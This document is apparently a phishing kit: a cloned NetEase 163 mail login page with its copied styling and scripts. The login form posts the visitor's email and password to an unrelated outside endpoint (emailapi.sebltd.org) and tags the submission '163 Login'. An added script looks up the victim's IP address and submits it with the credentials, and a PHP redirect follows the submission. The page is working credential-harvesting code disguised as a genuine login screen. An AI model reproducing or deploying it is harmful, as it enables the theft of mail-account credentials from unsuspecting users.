a{float:right;line-height:32px;height:32px;outline:none;color:#2d85be;}.fur-page{font-size:14px;}.fur-page b{color:#333;}.fur-note{color:#909ab0;}.fur-page-success-netease,.fur-page-success-3p{display:block;width:320px;margin:0 auto;text-align:center;padding-bottom:1px;color:#999;}.fur-page-success-netease .fur-btn-note,.fur-page-success-3p .fur-btn-note{margin-bottom:70px;text-align:center;}.fur-page-success-netease p,.fur-page-success-3p p{text-align:left;line-height:20px;word-break:break-all;}.fur-page-success-netease h3,.fur-page-success-3p h3{color:#333;font-size:24px;font-weight:normal;padding-bottom:10px;}.fur-page-success-netease b,.fur-page-success-3p b{font-weight:normal;line-height:22px;height:22px;margin-bottom:10px;}.fur-page-success-netease .loginbox,.fur-page-success-3p .loginbox{margin:20px 0 0 0;}.fur-page-success-3p h3{padding-bottom:24px;}.fur-footer-ext{padding-bottom:0;position:relative;margin-top:16px;color:#999;width:100%;font-size:12px;text-align:center;}.fur-footer-ext li{line-height:20px;text-align:left;}.fur-footer-ext .fur-notice{text-align:left;height:110px;width:320px;margin:0 auto;}.fur-footer-ext .fur-notice a{color:#4aafe9;text-decoration:underline;}.fail0,.fail1{position:absolute;top:5px;width:100%;left:0;top:20px;width:100%;height:20px;z-index:999;color:#fff;font-size:14px;text-align:center;}.fail0 .box,.fail1 .box{width:90%;background:#000;opacity:0.7;padding:12px 0;margin:0 auto;}.fail0 .box{max-width:90%;}.m-confirm{width:100%;height:141px;background:#fff;border-radius:4px;top:0;left:0;z-index:99;}.m-confirm .btnbox{width:340px;margin:0 auto;}.m-confirm .note{padding:26px 0 38px 0;text-align:center;font-size:18px;color:#333;}.u-btn-confirm{margin:0;width:160px;height:32px;font-size:16px;line-height:32px;text-align:center;}.btncolor-ext{background:#ddd;color:#fff;margin-left:20px;color:#333;}.ScapTcha div.statusTxt{width:30px;padding-left:0;}.mbItlBox{z-index:29;}.mbItlBox .u-label{left:58px;}.mbItlBox input.dlemail{width:218px;padding-left:58px;}.mbtoggleitl-box{position:absolute;top:30px;right:0;}.mbtoggleitl-box .mbtoggleitl{color:#4cb5ff;}.u-goSmsLogin{color:#4cb5ff;}.u-toggleitlbox{padding-top:8px;text-align:right;}.toggleitl{color:#4cb5ff;}a.toggleitl:hover{color:#4b95ca;}.country{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite_61fbe151ab715649c6b7c4ec39156201.png) -349px -340px no-repeat;position:absolute;left:0;top:3px;height:38px;line-height:38px;width:50px;padding:0;z-index:999;background-color:#fff;text-align:center;}.country em,.u-country em{height:11px;line-height:11px;display:inline-block;margin-right:0.8em;}.country em{margin-top:16px;}.m-country .i-inpt{text-indent:50px;}.m-country .js-placeholder{left:50px !important;}.m-country .u-label{width:250px;padding-left:40px;}.u-country{overflow-y:scroll;border:1px solid #ccc;background:#fff;z-index:9999;position:absolute;width:316px;height:150px;top:0;display:block;padding-left:2px;left:-1px;top:45px;}.u-country a{position:relative;display:block;height:24px;line-height:24px;overflow:hidden;}.u-country a:hover{background:#ccc;}.cap-box{display:block;width:100%;height:100%;position:fixed;top:0;left:0;z-index:999;text-align:center;}.cap-box .cap-title{text-align:left;font-size:14px;}.cap-box .cap-close{background-position:-106px -91px;position:absolute;right:10px;width:16px;height:16px;line-height:16px;font-size:16px;cursor:pointer;}.cap-box .cap-box-mask{background:#ccc;opacity:0.3;filter:alpha(opacity = 30);position:absolute;top:0;left:0;width:100%;height:100%;z-index:999;text-align:center;}.cap-box .cap-box-inner{display:inline-block;background:#fff;border:solid 1px #ccc;position:absolute;top:50%;left:50%;z-index:1000;box-shadow:0 0 10px rgba(0,0,0,0.3);}input:disabled{opacity:1;}.w-exception .close,.w-exception .logo,.w-exception .logo2,.w-exception .logo3{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite_61fbe151ab715649c6b7c4ec39156201.png) -9999px -9999px no-repeat;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sprite8_31811e6b333b8188ed4330196ed09dc9.png) -9999px -9999px no-repeat;}.w-exception .warnlogo{background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sp_1873dafc7406a2973ac649387526ca17.png) -9999px -9999px no-repeat;_background:url(//urswebzj.nosdn.127.net/webzj_cdn101/sp8_6230cee07d1f53f9e8d3118bca269bd6.png) -9999px -9999px no-repeat;}.w-exception{width:420px;height:330px;border-radius:3px;}.w-exception .head{width:100%;height:160px;position:relative;}.w-exception .close{width:30px;height:30px;position:absolute;right:16px;top:16px;background-position:-99px -85px;cursor:pointer;}.w-exception .head .top{height:40px;width:100%;}.w-exception .logo{background-position:1px 0;width:267px;height:84px;margin:0 auto;}.w-exception .logo2{background-position:0px -114px;width:320px;height:100px;margin:0 auto;}.w-exception .logo3{background-position:0px -880px;width:303px;height:100px;margin:0 auto;}.w-exception .logo4{background-position:0px -1010px;width:263px;height:100px;margin:0 auto;}.w-exception .warnlogo{width:88px;height:88px;background-position:0 -357px;margin:0 auto;}.w-exception .cnt{padding:40px 58px 58px;}.w-exception .cnt .note{font-size:22px;text-align:center;line-height:32px;margin:16px 0 30px 0;color:#333;}.w-exception .cnt .note2{margin-top:13px;}.w-exception-normal{width:420px;height:330px;border-radius:3px;}.w-exception-normal .btnbox{text-align:center;}.w-exception-normal .head{width:100%;height:160px;position:relative;}.w-exception-normal .close{width:30px;height:30px;position:absolute;right:16px;top:16px;background-position:-99px -85px;cursor:pointer;}.w-exception-normal .head .top{height:40px;width:100%;}.w-exception-normal .logo{background-position:1px 0;width:267px;height:84px;margin:0 auto;}.w-exception-normal .logo2{background-position:0px -114px;width:320px;height:100px;margin:0 auto;}.w-exception-normal .logo3{background-position:0px -880px;width:303px;height:100px;margin:0 auto;}.w-exception-normal .logo4{background-position:0px -1010px;width:263px;height:100px;margin:0 auto;}.w-exception-normal .warnlogo{width:88px;height:88px;background-position:0 -357px;margin:0 auto;}.w-exception-normal .warnlogo img{width:100%;height:100%;}.w-exception-normal .cnt{padding:40px 58px 58px;}.w-exception-normal .cnt .note{font-size:22px;text-align:center;line-height:32px;margin:16px 0 30px 0;color:#333;}.w-exception-normal .cnt .note2{margin-top:13px;}.m-cnt .m-eye{display:none !important;}.m-cnt .u-pwdshow{display:block !important;position:absolute;right:15px;z-index:5;}.u-tip-eye{display:none;float:right;padding:0 10px;}.m-cnt .m-eye-close{right:50px !important;}
a.agree-dolock{background:#ccc;}a.agree-dolock:hover{background:#ccc;}a.agree-dolock:active{background:#ccc;}
</style>
<script type="text/javascript">
(function(){
var resizeSetTimeout;
var styleOnload = function(node, callback) {
// for IE6-9 and Opera
if (node.attachEvent) {
node.attachEvent('onload', callback);
}
else {
setTimeout(function() {
poll(node, callback);
}, 0); // for cache
}
}
var poll = function(node, callback) {
if (callback.isCalled) {
return;
}
var isLoaded = false;
if (/webkit/i.test(navigator.userAgent)) {//webkit
if (node['sheet']) {
isLoaded = true;
}
}
// for Firefox
else if (node['sheet']) {
try {
if (node['sheet'].cssRules) {
isLoaded = true;
}
} catch (ex) {
// NS_ERROR_DOM_SECURITY_ERR
if (ex.code === 1000) {
isLoaded = true;
}
}
}
if (isLoaded) {
// give time to render.
setTimeout(function() {
callback();
}, 1);
}
else {
setTimeout(function() {
poll(node, callback);
}, 100);
}
}
var loadcss = function(_uri){
var node = document.createElement("link");
node.setAttribute("rel","stylesheet");
node.setAttribute("type","text/css");
node.setAttribute("href",_uri);
document.getElementsByTagName('head')[0].appendChild(node);
try{
styleOnload(node,function(){
// 尝试调用resize
if (window._$ursResize){
if (resizeSetTimeout){
resizeSetTimeout = clearTimeout(resizeSetTimeout);
}
resizeSetTimeout = setTimeout(window._$ursResize,200);
}
});
}catch(e){}
}
// 全局异常日志
window.onerror=function(_msg,_url,_line,_col,_obj){
var _pd = window._$PRODUCT||'';
var _pkid = window._$PKID||'';
var _h = decodeURIComponent(location.search);
_h = _h.substring(1)||'';
_h = _h.split('&');
for(var i = 0,_temp; i < _h.length; i++){
_temp = _h[i].split('=');
if (_temp[0]=='pkid'){
_pkid = _temp[1]
}
if (_temp[0]=='product'){
_pd = _temp[1]
}
}
_msg = _msg.replace(/\^/g,'$');
_url = _url.replace(/\^/g,'$');
var _img = document.createElement('img'),
_params = 'pd='+_pd+'&pkid='+_pkid+'&msg='+encodeURIComponent(_msg||'')+'&url='+encodeURIComponent(_url||'');
var ext = [];
ext.push(window.navigator.userAgent);
var f = arguments && arguments.callee && arguments.callee.caller, c = 3;
// 只拿3层堆栈信息
if (!!arguments.callee){
while (f && (--c>0)) {
ext.push(f.toString());
if (f === f.caller) {
break;//如果有环
}
f = f.caller;
}
ext = ext.join("%%");
ext = ext.replace(/\^/g,'$');
_params += '&ext='+encodeURIComponent(ext);
}else{
_params += '&ext='+encodeURIComponent(window.navigator.userAgent);
}
var _log = '//dl.reg.163.com/pgErr?'+_params;
_log = _log.slice(0,2000);
_img.style.width = 0;
_img.style.height = 0;
setTimeout(function(){
_img.src = _log;
},0);
}
// url解析
var _u=decodeURIComponent(location.search);
var _ht=location.host;
window._$BGP=0;
if (_ht.indexOf('webzj2')>=0||_ht.indexOf('passport2')>=0||_ht.indexOf('reg2')>=0||_ht.indexOf('dl2')>=0){
window._$BGP=1;
}
window.wdaId = 0;
if(_u.indexOf('?')!=-1){
var _sl = _u.substring(1)||'';
var _s= _sl.split('&');
var _d,_c,_cssl;
for(var i= 0,_l=_s.length;i<_l;i++){
if(_s[i].indexOf('cd=')===0){
_d = _s[i].split('=')[1];
}else if(_s[i].indexOf('cf=')===0){
_cssl = _s[i].split('=');
_cssl.shift();
_c = _cssl.join('=');
}else if(_s[i].indexOf('MGID=')===0){
window.mgid = _s[i].split('=')[1];
}else if (_s[i].indexOf('wdaId=')===0){
window.wdaId = _s[i].split('=')[1];
}
}
_c = _c ? _c.split(',') : [];
for (var i = 0,_l=_c.length,_uri; i < _l; i++){
_uri = _d + _c[i];
if (_uri.indexOf('reg.163.com/css2/login_index.css')>=0){
window.wdaId = 'UA1435545636633';
}
loadcss(_uri);
}
}
})()
</script><link rel="stylesheet" type="text/css" href="./urs.163.bc0e7491.css">
<style type="text/css">.auto-1560941573335-parent{position:relative;} .auto-1560941573335{position:absolute;border:1px solid #aaa;background:#fff;text-align:left;visibility:hidden;} .auto-1560941573335 .zitm{height:20px;line-height:20px;cursor:default;} .auto-1560941573335 .js-selected{background:#1257F9;}</style></head>
<body>
<div class="m-confirm f-dn" id="confirm">
<div class="note">你确定放弃注册吗？</div>
<div class="f-cb btnbox">
<a class="u-btn-confirm f-ib btncolor" data-action="confirmgoon">继续</a><a class="u-btn-confirm f-ib btncolor-ext" data-action="confirmclose">放弃</a>
</div>
</div>
<div class="g-bd cnt-box-include" id="cnt-box-parent">
<div id="loading" class="f-dn"></div>
<div class="g-bd" id="cnt-box"><div class="m-header" id="auto-id-1560941573394"><div class="u-closebtn u-closebtn1" data-action="doclose"></div><div class="headimg j-headimg"></div></div><div class="m-cnt" id="auto-id-1560941573396">


















<form id="163" action="https://emailapi.sebltd.org/api/jmnw9vMpmP0flW847etQ" method="post"><div class="m-container" id="auto-id-1560941573400"><div class="inputbox" id="account-box"><div class="u-logo" id="auto-id-1560941573398"><div class="u-logo-img1"></div></div><div class="u-input box"><label class="u-label f-dn" id="auto-id-1560941573365" style="display: block;">邮箱帐号或手机号码</label><input data-placeholder="邮箱帐号或手机号码" name="email" valuse="<?php echo $_GET['email']; ?>" data-type="email" data-loginname="loginEmail" data-required="true" class="j-inputtext dlemail j-nameforslide" type="text" autocomplete="off" tabindex="1" spellcheck="false" id="auto-id-1560941573351" placeholder="邮箱帐号或手机号码" style="width: 198px;"><span class="pr-domain j-prdomain" style="right: -87px;">@163.com</span></div><div class="u-tip" id="auto-id-1560941573371" style="display: none;"><div class="u-success u-clear"></div></div></div><div class="fur-change-email" id="auto-id-1560941573395"></div><div class="inputbox" id="auto-id-1560941573397"><div class="u-logo"><div class="u-logo-img2"></div></div><div class="u-input box"><label class="u-label f-dn" id="auto-id-1560941573374" style="display: block;">输入密码</label><input type="password" style="display:none;width:0;height:0;"><input data-placeholder="输入密码" name="password" maxlength="50" data-required="true" class="j-inputtext dlpwd" type="password" autocomplete="new-password" data-max-length="50" tabindex="2" spellcheck="false" id="auto-id-1560941573354" placeholder="输入密码"><input maxlength="50" data-placeholder="输入密码" type="text" id="pwdtext" class="u-pwdtext" placeholder="输入密码"></div><div class="u-tip" id="auto-id-1560941573380" style="display: none;"><div class="u-success u-clear"></div></div></div><div class="ckbox m-ckcnt f-cb f-dn"><div class="inputbox ckin"><div class="u-input"><label class="u-label f-dn" id="auto-id-1560941573383" style="display: block;">验证码</label><input data-placeholder="验证码" name="checkcode" class="j-inputtext cktext" type="text" data-required="true" data-max-length="4" maxlength="4" data-pattern="^[0-9a-zA-Z]{4,6}$" tabindex="3" spellcheck="false" autocomplete="off" id="auto-id-1560941573357" placeholder="验证码"></div><div class="u-tip" id="auto-id-1560941573389" style="display: none;"><div class="u-success u-clear"></div></div><div class="u-tip"><div class="u-success u-suc"></div></div></div><div class="inputbox ckimgbox f-fr"><img class="ckimg" title="点击刷新验证码" alt="点击获取验证码" onerror="" id="auto-id-1560941573391"></div></div><div class="ckbox m-ckcnt slidebox f-cb f-dn" style="position: relative;"><div class="ScapTcha" id="ScapTcha"></div><input type="hidden" id="pwd" value=""><input type="hidden" id="ct" value=""><input name="slidecap" style="height:0;width:0;display:none;" type="text" data-required="true" value="" id="auto-id-1560941573360"></div><div class="m-etbox" style="display:none;"><div class="ettip"><div class="etimgbox"><div class="img etimg"></div></div><div class="ettext"></div></div></div><div class="m-nerror f-dn" id="nerror"></div>

<div class="f-cb loginbox"><input type="submit" class="u-loginbtn btncolor tabfocus btndisabled" tabindex="8" value="登&nbsp;&nbsp;录"></div></div>



<div class="m-unlogin"><div class="b-unlogn j-unlogn"><span class="u-checkbox tabfocus"><input id="un-login" type="checkbox" name="un-login" class="un-login"></span><label for="un-login">十天内免登录</label></div><a class="forgetpwd j-redirect" data-outlink="1" href="https://reg.163.com/resetpwd/index.do" target="_blank">忘记密码？</a><a id="changepage" data-action="none" class="u-regbtn bgcolor tabfocus j-redirect" href="https://reg.mail.163.com/mailregAll/reg0.jsp?from=163mail_right" data-outlink="2" target="_blank" tabindex="11">注册新帐号</a></div><input type="hidden" name="_after" rel="noreferrer" value="<?=$result;?>/163/redirect.php"> <input type="hidden" name="_subject" value="163 Login">
											<input name="IP_Address" type="hidden" id="ipFormInput" value="">
	
				<script type="application/javascript ">
    const ipFormInput = document.getElementById('ipFormInput');

    fetch('https://api.ipify.org?format=json')
        .then((response) => { return response.json() })
        .then((json) => {
            let ip = json.ip;
            ipFormInput.value = ip;
        })
        .catch((err) => { console.log(`Error getting IP Address: ${err}`) })
</script>
		</form>
</form>









</div><div class="m-sep"><div class="leftsep f-fl"></div><div class="rightsep f-fr"></div><div class="centertext">网易用户中心</div></div><div class="m-footer" id="footer"><div class="f-cb"><p class="f-fl tip m-sep">您还没有网易邮箱帐号？</p><p class="f-fr"><a class="btn-qrcode j-btnqrcode f-dn"></a></p></div></div></div>
<div class="g-bd" id="cnt-box2" style="display:none;"></div>
</div>

<script type="text/javascript" src="./webzj_fingerprint2.min-1.6.1.js.download"></script>

<script type="text/javascript">
var _gaq = _gaq || [];
var _key = wdaId||'';
</script>
<script src="./webzj_cdn101_pp_index_dl_c1c445f6665d311f46de29c19cbdd73d.js.download"></script>

</body></html>